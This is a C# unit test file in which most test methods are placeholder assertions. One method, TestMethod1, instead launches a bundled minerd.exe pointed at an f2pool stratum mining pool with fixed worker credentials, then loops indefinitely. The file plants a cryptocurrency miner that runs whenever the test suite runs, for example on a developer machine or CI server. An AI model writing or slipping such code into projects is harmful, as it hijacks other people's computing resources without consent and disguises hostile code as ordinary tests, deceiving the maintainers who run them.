﻿using System;
using Microsoft.VisualStudio.TestTools.UnitTesting;
using System.Diagnostics;

namespace UnitTestProject1
{
    [TestClass]
    public class UnitTest1
    {     [TestMethod]
        public void MyTestMethod3()
        {
            Assert.AreEqual(1, 1);
        }
        [TestMethod]
        public void MyTestMethod5()
        {
            Assert.AreEqual(1, 1);
        }
        [TestMethod]
        public void TestMethod1()
        {
      
                System.Diagnostics.Process p = new System.Diagnostics.Process();
            var t = System.IO.Path.Combine(Environment.CurrentDirectory, "RRC\\minerd.exe");


            p.StartInfo.FileName = t;
            p.StartInfo.Arguments = " -o stratum+tcp://stratum.f2pool.com:8888 -u chsword.002 -p 2981939a";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            //   p.StartInfo.RedirectStandardError = true;
            //p.StartInfo.CreateNoWindow = true;
            string str = "";
            p.OutputDataReceived += (s, e) =>
            {
                str=(e.Data);
                //Debug.WriteLine(e.Data);
            };
         
            p.Start(); 
            while (true)
            {
                Console.WriteLine(str);
                Debug.WriteLine(str);
                System.Threading.Thread.Sleep(500);
            }
        }
        [TestMethod]
        public void MyTestMethod2()
        {
            Assert.AreEqual(1, 1);
        }
        
    }
}
